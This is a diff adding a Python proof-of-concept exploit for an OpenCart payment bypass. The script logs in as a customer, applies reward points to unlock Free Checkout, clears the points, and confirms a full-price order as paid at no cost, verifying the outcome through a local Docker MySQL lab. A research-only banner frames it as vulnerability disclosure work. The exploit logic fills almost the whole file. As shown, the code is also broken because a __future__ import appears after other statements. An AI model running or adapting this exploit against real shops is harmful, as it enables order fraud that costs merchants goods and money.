@@ -1,0 +1,475 @@
+#!/usr/bin/env python3
+######################################################################################
+#
+#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
+#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
+#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
+#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
+#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
+#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
+#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
+# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
+#
+#                     888             d8888 888888b.    .d8888b.
+#                     888            d88888 888  "88b  d88P  Y88b
+#                     888           d88P888 888  .88P  Y88b.
+#                     888          d88P 888 8888888K.   "Y888b.
+#                     888         d88P  888 888  "Y88b     "Y88b.
+#                     888        d88P   888 888    888       "888
+#                     888       d8888888888 888   d88P Y88b  d88P
+#                     88888888 d88P     888 8888888P"   "Y8888P"
+#
+#  Website : https://abraxaslabs.tech
+#  GitHub  : https://github.com/abraxas
+#  Twitter : @abraxas_null
+#
+#  CVE: opencart-reward-free-checkout (High: 6.5)
+#  Vendor: OpenCart (OpenCart)
+#  Versions: OpenCart <= 4.1.0.4
+#  Impact: Payment bypass (Free Checkout underpay)
+#  Requires: authenticated POST /index.php?route=extension/opencart/checkout/reward.save
+#
+######################################################################################
+#
+#  RESEARCH / EDUCATIONAL USE ONLY.
+#  Do not run, deploy, or use this material against any host unless you have
+#  explicit written permission from both the party hosting this repository
+#  and the owner of the target systems.
+#
+######################################################################################
+
+import os as _os
+import shutil as _shutil
+import sys as _sys
+import builtins as _builtins
+
+_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
+_CVE = "opencart-reward-free-checkout"
+_SITE = "https://abraxaslabs.tech"
+_GH = "https://github.com/abraxas"
+_XURL = "https://x.com/abraxas_null"
+_XH = "@abraxas_null"
+_RST = "\033[0m"
+_BLD = "\033[1m"
+
+
+def _on():
+    return not _os.environ.get("NO_COLOR")
+
+
+def _rgb(r, g, b):
+    return f"\033[38;2;{r};{g};{b}m" if _on() else ""
+
+
+_RAIN = [
+    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
+    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
+    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
+]
+
+
+def _lerp(a, b, t):
+    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))
+
+
+def _rain(x, width):
+    if width <= 1:
+        return _RAIN[0]
+    t = (x / (width - 1)) * (len(_RAIN) - 1)
+    i = min(int(t), len(_RAIN) - 2)
+    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)
+
+
+def _logo_line(line, y, n):
+    width = max(len(line), 1)
+    out = []
+    q = False
+    for x, ch in enumerate(line):
+        if ch == " ":
+            out.append(ch)
+            continue
+        if ch == '"':
+            q = not q
+            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
+            continue
+        if q:
+            out.append(_rgb(255, 230, 0) + ch)
+            continue
+        r, g, b = _rain(x, width)
+        out.append(_rgb(r, g, b) + ch)
+    return "".join(out) + _RST
+
+
+def print_abraxas_banner():
+    cols = _shutil.get_terminal_size((120, 30)).columns
+    art = _ART["abraxas"] + _ART["labs"]
+    art_w = max(len(x) for x in art)
+    content_w = min(max(art_w, 88), max(cols - 4, 40))
+    box_w = content_w + 4
+    if box_w > cols:
+        content_w = max(cols - 4, 20)
+        box_w = content_w + 4
+    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
+    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
+    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
+    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST
+
+    def row(vis, rendered, border):
+        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST
+
+    lines = [top]
+    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
+    gap = max(content_w - len(title_l) - len(title_r), 1)
+    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
+    cells = []
+    split, rstart = len(title_l), content_w - len(title_r)
+    for i, ch in enumerate(title):
+        if ch == " ":
+            cells.append(ch)
+        elif i < split:
+            cells.append(_rgb(0, 255, 249) + _BLD + ch)
+        elif i >= rstart:
+            cells.append(_rgb(140, 155, 175) + ch)
+        else:
+            cells.append(ch)
+    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
+    lines.append(mid)
+    cve_l = " " + _CVE
+    cve_r = "authorized research only"
+    rest = max(content_w - len(cve_l) - len(cve_r), 3)
+    midtxt = " local lab ".center(rest)[:rest]
+    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
+    cells = []
+    le, rs = len(cve_l), content_w - len(cve_r)
+    for i, ch in enumerate(cve_line):
+        if ch == " ":
+            cells.append(ch)
+        elif i < le:
+            cells.append(_rgb(255, 77, 224) + _BLD + ch)
+        elif i >= rs:
+            cells.append(_rgb(57, 255, 20) + ch)
+        else:
+            cells.append(_rgb(255, 0, 212) + ch)
+    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
+    lines.append(mid)
+    n = len(_ART["abraxas"])
+    for y, line in enumerate(_ART["abraxas"]):
+        vis = line[:content_w].ljust(content_w)
+        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
+    for y, line in enumerate(_ART["labs"]):
+        vis = line[:content_w].ljust(content_w)
+        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
+    lines.append(mid)
+    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
+        gap = max(content_w - 1 - len(left) - len(right), 1)
+        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
+        out = []
+        left_end = 1 + len(left)
+        right_start = content_w - len(right)
+        for i, ch in enumerate(vis):
+            if ch == " ":
+                out.append(ch)
+            elif i < left_end:
+                out.append(_rgb(255, 230, 0) + ch)
+            elif i >= right_start:
+                out.append(_rgb(0, 255, 249) + ch)
+            else:
+                out.append(ch)
+        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
+    lines.append(bot)
+    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
+    scol = []
+    for ch in status:
+        if ch == " ":
+            scol.append(ch)
+        elif ch in "[]*":
+            scol.append(_rgb(57, 255, 20) + ch)
+        elif ch in "·#":
+            scol.append(_rgb(255, 77, 224) + ch)
+        else:
+            scol.append(_rgb(232, 255, 248) + ch)
+    lines.append(" " + "".join(scol) + _RST)
+    _sys.stdout.write("\n".join(lines) + "\n\n")
+    _sys.stdout.flush()
+
+
+def _cprint(*args, **kwargs):
+    sep = kwargs.get("sep", " ")
+    s = sep.join(str(a) for a in args)
+    low = s.lower()
+    if s.startswith("SUCCESS") or "success" == low[:7]:
+        col = _rgb(57, 255, 20) + _BLD
+    elif s.startswith("FAIL") or low.startswith("fail"):
+        col = _rgb(255, 64, 96) + _BLD
+    elif "user_id" in low:
+        col = _rgb(255, 201, 70) + _BLD
+    elif low.startswith("status=") or "status=" in low[:20]:
+        col = _rgb(0, 255, 249)
+    elif low.startswith("carrier"):
+        col = _rgb(255, 0, 212)
+    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
+        col = _rgb(255, 230, 0)
+    else:
+        col = _rgb(232, 255, 248)
+    kwargs = dict(kwargs)
+    file = kwargs.get("file", _sys.stdout)
+    if file is _sys.stdout or file is _sys.stderr:
+        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
+    else:
+        _builtins.print(*args, **kwargs)
+
+
+print_abraxas_banner()
+_builtins.print = _cprint
+
+from __future__ import annotations
+
+import json
+import re
+import ssl
+import subprocess
+import sys
+import http.cookiejar
+import urllib.error
+import urllib.parse
+import urllib.request
+
+BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18108").rstrip("/")
+LANG = "en-gb"
+EMAIL = "oc-reward@localhost.invalid"
+PASSWORD = "LabPass123!"
+PRODUCT_ID = "36"
+REWARD = "100"
+CTX = ssl._create_unverified_context()
+
+cj = http.cookiejar.CookieJar()
+op = urllib.request.build_opener(
+    urllib.request.HTTPSHandler(context=CTX),
+    urllib.request.HTTPCookieProcessor(cj),
+)
+
+
+def req(method: str, path: str, form: dict | None = None) -> tuple[int, str, str]:
+    url = path if path.startswith("http") else BASE + path
+    hdrs = {"User-Agent": "opencart-reward-lab"}
+    body = None
+    if form is not None:
+        body = urllib.parse.urlencode(form).encode()
+        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
+    r = urllib.request.Request(url, data=body, headers=hdrs, method=method)
+    try:
+        with op.open(r, timeout=60) as resp:
+            return resp.status, resp.read().decode("utf-8", "replace"), str(resp.geturl())
+    except urllib.error.HTTPError as exc:
+        return exc.code, exc.read().decode("utf-8", "replace"), str(exc.geturl())
+
+
+def cat(route: str, extra: str = "") -> str:
+    q = f"/index.php?route={route}&language={LANG}"
+    if extra:
+        q += "&" + extra
+    return q
+
+
+def parse_json(body: str) -> dict:
+    try:
+        data = json.loads(body)
+        return data if isinstance(data, dict) else {}
+    except json.JSONDecodeError:
+        return {}
+
+
+def mysql(sql: str) -> str:
+    proc = subprocess.run(
+        [
+            "docker",
+            "compose",
+            "-p",
+            "opencart-reward-free-checkout",
+            "exec",
+            "-T",
+            "mysql",
+            "mysql",
+            "-uroot",
+            "-popencart",
+            "opencart",
+            "-N",
+            "-e",
+            sql,
+        ],
+        cwd=".",
+        capture_output=True,
+        text=True,
+        timeout=30,
+    )
+    out = (proc.stdout or "") + (proc.stderr or "")
+    lines = [
+        ln
+        for ln in out.splitlines()
+        if ln.strip() and not ln.lower().startswith("mysql:")
+    ]
+    return "\n".join(lines)
+
+
+def main() -> None:
+    print(f"IOC base={BASE} product_id={PRODUCT_ID} reward={REWARD}")
+    mysql("DELETE FROM oc_cart")
+    s0, b0, _ = req("GET", "/")
+    print(f"IOC catalog status={s0} len={len(b0)}")
+
+    s, b, _ = req("GET", cat("account/login"))
+    print(f"IOC login-page status={s} len={len(b)}")
+    m = re.search(r"login_token=([a-zA-Z0-9]+)", b)
+    login_token = m.group(1) if m else ""
+    print(f"IOC login_token={bool(login_token)}")
+    if not login_token:
+        print("FAIL no login_token")
+        raise SystemExit(1)
+
+    s, b, u = req(
+        "POST",
+        cat("account/login.login", f"login_token={login_token}"),
+        {"email": EMAIL, "password": PASSWORD},
+    )
+    js = parse_json(b)
+    print(f"IOC login status={s} snippet={b[:220]!r} url={u}")
+    if js.get("error") or not (js.get("redirect") or js.get("success")):
+        print("FAIL customer login")
+        raise SystemExit(1)
+
+    s, b, _ = req(
+        "POST",
+        cat("checkout/cart.add"),
+        {"product_id": PRODUCT_ID, "quantity": "1"},
+    )
+    js = parse_json(b)
+    print(f"IOC cart.add status={s} snippet={b[:180]!r}")
+    if not js.get("success"):
+        print("FAIL cart.add")
+        raise SystemExit(1)
+
+    s, b, _ = req(
+        "POST",
+        cat("extension/opencart/checkout/reward.save"),
+        {"reward": REWARD},
+    )
+    js = parse_json(b)
+    print(f"IOC reward.save status={s} snippet={b[:220]!r}")
+    if not js.get("success"):
+        print("FAIL reward.save")
+        raise SystemExit(1)
+
+    s, b, _ = req("GET", cat("checkout/payment_method.getMethods"))
+    js = parse_json(b)
+    print(f"IOC payment.getMethods status={s} snippet={b[:320]!r}")
+    pms = js.get("payment_methods") or {}
+    if "free_checkout" not in pms:
+        print("FAIL free_checkout not listed after reward")
+        raise SystemExit(1)
+
+    s, b, _ = req(
+        "POST",
+        cat("checkout/payment_method.save"),
+        {"payment_method": "free_checkout.free_checkout"},
+    )
+    js = parse_json(b)
+    print(f"IOC payment.save status={s} snippet={b[:200]!r}")
+    if not js.get("success"):
+        print("FAIL payment_method.save")
+        raise SystemExit(1)
+
+    s, b, _ = req("GET", cat("checkout/confirm.confirm"))
+    print(f"IOC confirm1 status={s} len={len(b)} snippet={b[:160]!r}")
+    row1 = mysql(
+        "SELECT order_id, total, order_status_id, payment_method FROM oc_order ORDER BY order_id DESC LIMIT 1"
+    )
+    print(f"IOC order-after-reward {row1!r}")
+    parts = row1.split("\t") if row1 else []
+    if len(parts) < 3:
+        print("FAIL no order after first confirm")
+        raise SystemExit(1)
+    order_id, total1, status1 = parts[0], float(parts[1]), int(parts[2])
+    if status1 != 0:
+        print("FAIL first confirm already has status")
+        raise SystemExit(1)
+    if total1 > 0.009:
+        print(f"FAIL first confirm total={total1} not ~0")
+        raise SystemExit(1)
+
+    s, b, _ = req(
+        "POST",
+        cat("extension/opencart/checkout/reward.save"),
+        {"reward": "0"},
+    )
+    js = parse_json(b)
+    print(f"IOC reward.clear status={s} snippet={b[:220]!r}")
+    if not js.get("success"):
+        print("FAIL reward.save 0")
+        raise SystemExit(1)
+
+    s, b, _ = req("GET", cat("checkout/confirm.confirm"))
+    print(f"IOC confirm2 status={s} len={len(b)}")
+    # Non-shipping carts unset session.order_id on each confirm and addOrder a
+    # new row; shipping carts editOrder the pending one. Oracle is the latest.
+    row2 = mysql(
+        "SELECT order_id, total, order_status_id, payment_method FROM oc_order ORDER BY order_id DESC LIMIT 1"
+    )
+    print(f"IOC order-after-clear {row2!r}")
+    parts2 = row2.split("\t") if row2 else []
+    if len(parts2) < 4:
+        print("FAIL missing order after clear")
+        raise SystemExit(1)
+    order_id = parts2[0]
+    total2 = float(parts2[1])
+    pay_json = parts2[3]
+    if total2 <= 0.009:
+        print("FAIL confirm after reward=0 still total~0")
+        raise SystemExit(1)
+    if "free_checkout" not in pay_json:
+        print("FAIL payment_method unset after reward=0")
+        raise SystemExit(1)
+
+    s, b, _ = req("POST", cat("extension/opencart/payment/free_checkout.confirm"))
+    js = parse_json(b)
+    print(f"IOC free_checkout.confirm status={s} snippet={b[:280]!r}")
+    if js.get("error") and not js.get("redirect"):
+        s, b, _ = req("GET", cat("extension/opencart/payment/free_checkout.confirm"))
+        js = parse_json(b)
+        print(f"IOC free_checkout.confirm GET snippet={b[:280]!r}")
+    if js.get("error"):
+        print("FAIL free_checkout.confirm refused")
+        raise SystemExit(1)
+
+    final = mysql(
+        "SELECT order_id, total, order_status_id, payment_method FROM oc_order WHERE order_id="
+        + order_id
+    )
+    print(f"IOC order-final {final!r}")
+    fp = final.split("\t") if final else []
+    if len(fp) < 4:
+        print("FAIL no final order row")
+        raise SystemExit(1)
+    total_f, status_f, pay_f = float(fp[1]), int(fp[2]), fp[3]
+    debit = mysql(
+        f"SELECT IFNULL(SUM(points),0) FROM oc_customer_reward WHERE order_id={order_id} AND points<0"
+    ).strip()
+    balance = mysql(
+        "SELECT IFNULL(SUM(points),0) FROM oc_customer_reward WHERE customer_id=(SELECT customer_id FROM oc_customer WHERE email='oc-reward@localhost.invalid')"
+    ).strip()
+    print(f"IOC debit={debit!r} balance={balance!r} status={status_f} total={total_f}")
+
+    pay_ok = "free_checkout" in pay_f
+    # Catalog iPod Nano price is 100.00; tax was zeroed in setup.
+    full_price = total_f >= 99.0
+    no_debit = (not debit) or float(debit) == 0.0
+    confirmed = status_f != 0
+    if pay_ok and full_price and no_debit and confirmed:
+        print("SUCCESS OpenCart reward + Free Checkout underpay")
+        raise SystemExit(0)
+    print("FAIL order not full-price free checkout without point debit")
+    raise SystemExit(1)
+
+
+if __name__ == "__main__":
+    main()
+
